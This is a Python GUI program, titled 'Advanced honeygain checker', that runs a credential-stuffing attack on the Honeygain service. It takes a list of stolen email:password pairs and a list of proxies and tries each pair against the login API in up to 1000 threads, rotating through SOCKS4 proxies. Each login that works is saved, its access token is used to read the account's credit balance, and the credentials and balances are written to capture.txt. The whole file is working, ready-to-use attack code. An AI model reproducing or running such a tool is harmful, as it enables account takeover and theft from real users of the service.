import tkinter 
from tkinter import *
from tkinter import filedialog as fd
from tkinter import ttk
from tkinter import messagebox
import random
import requests
import time
import threading
from threading import *
class main(Tk):

    goodamt = 0
    badamt = 0
    fiveamt = 0
    tenamt = 0

    def __init__(self):
        super().__init__()
        self.threadslabel = Label(text="Threads")
        self.threadslabel.pack()
        self.v1 = DoubleVar()
        self.scale1 = Scale(variable=self.v1,from_=0, to=1000, orient=HORIZONTAL)
        self.scale1.pack()
        self.pickproxies = Button(text="Pick proxies", command=self.pickproxies1)
        self.pickproxies.pack()
        self.pickaccounts = Button(text="Pick Accounts",command=self.pickaccounts1)
        self.pickaccounts.pack()
        self.good = Label(text="Good:0")
        self.good.pack()
        self.bad = Label(text="Bad:0")
        self.bad.pack()
        self.proxycount = Label(text="Proxies: 0")
        self.proxycount.pack()
        self.accountcount = Label(text="Accounts: 0")
        self.accountcount.pack()
        self.labelspace = Label(text="")
        self.labelspace.pack()
        self.fivelabel = Label(text="0-1000:0")
        self.fivelabel.pack()
        self.tenlabel = Label(text="10000+:0")
        self.tenlabel.pack()
        self.labelspace2 = Label(text="")
        self.labelspace2.pack()
        self.progesslabel = Label(text="Progress:0")
        self.progesslabel.pack()
        self.pb = ttk.Progressbar(orient=HORIZONTAL, length=160)
        self.pb.pack()
        self.startbutton = Button(text="Start checking", command=lambda:threading.Thread(target=self.threader ,daemon=True).start())
        self.startbutton.pack()
    def pickproxies1(self):
        try:
            self.filename = fd.askopenfilename(title="Pick proxies")
            with open(self.filename) as file:
                self.proxies = file.read().splitlines()
                self.proxycount["text"] = "Proxies:",len(self.proxies)
            if len(self.proxies) == 0:
                messagebox.showerror("Error","Proxy text file is empty")
        except:
            messagebox.showerror("File not found","Select a proxy file to check")
    def pickaccounts1(self):
        try:
            self.filename1 = fd.askopenfilename(title="Pick accounts")
            with open(self.filename1,encoding="utf-8") as file:
                self.combolist = file.read().splitlines()
                self.accountcount["text"] = "Accounts:",len(self.combolist)
            if len(self.combolist) == 0:
                messagebox.showerror("Error","Combo text file is empty")
        except:
            messagebox.showerror("File not found","Select a combo file to check")
    def check(self, combo):
        
        self.url = "https://dashboard.honeygain.com/api/v1/users/tokens"
        self.balanceurl = "https://dashboard.honeygain.com/api/v1/users/balances"
        acc = combo.split(":")
        email = acc[0]
        password = acc[1]
        data = {"email":email,"password":password}
        while True:
            proxy = random.choice(self.proxies)
            try:
                self.checkit = requests.post(self.url, json=data,proxies={"https":f"socks4://{proxy}"},timeout=5)
                if "access_token" in self.checkit.text:
                    with open("good.txt","a") as file:
                        file.write(combo + "\n")
                    main.goodamt+=1
                    self.token = self.checkit.json()["data"]["access_token"]
                    self.header = {"authorization":f"Bearer {self.token}"}
                    self.checkbalance = requests.get(self.balanceurl,headers=self.header,proxies={"https":f"socks4://{proxy}"})
                    self.balance = self.checkbalance.json()["data"]["payout"]["credits"]
                    print(self.balance)
                    if self.balance <= 10000:
                        main.fiveamt+=1
                        with open("capture.txt","a") as file:
                            file.write(combo + "  |" + "  Balance :" + str(self.balance) + "\n")
                    elif self.balance > 10000:
                        main.tenamt+=1
                        with open("capture.txt","a") as file:
                            file.write(combo + "|" + "Balance :" + str(self.balance) + "\n")
                    return
                elif "Bad credentials" in self.checkit.text:
                    with open("bad.text","a") as file:
                        file.write(combo + "\n")
                    main.badamt+=1
                    return
            except:
                pass
        

    def updater(self):
        while 1:
            try:
                self.good["text"] = "Good:",main.goodamt
                self.bad["text"] = "Bad:",main.badamt
                self.tenlabel["text"] = "0-10000+:",main.tenamt
                self.fivelabel["text"] = "0-10000:",main.fiveamt
                self.progesslabel["text"] = "Progress:",(main.goodamt + main.badamt) / len(self.combolist) * 100,"%"
                self.pb["value"]+=(main.goodamt + main.badamt) / len(self.combolist) * 100
            except:
                pass
            finally:
                time.sleep(0.1)

    def threader(self):
        Thread(target=self.updater, daemon=True).start()
        for combo in self.combolist:
            while True:
                if threading.active_count() < self.scale1.get() + 2:
                    threading.Thread(target=self.check, args=(combo, )).start()
                    break
                else:
                    time.sleep(0.5)

if __name__ == "__main__":
    g = main()
    g.title("Advanced honeygain checker")
    g.geometry("200x350")
    g.resizable(False, False)
    g.mainloop()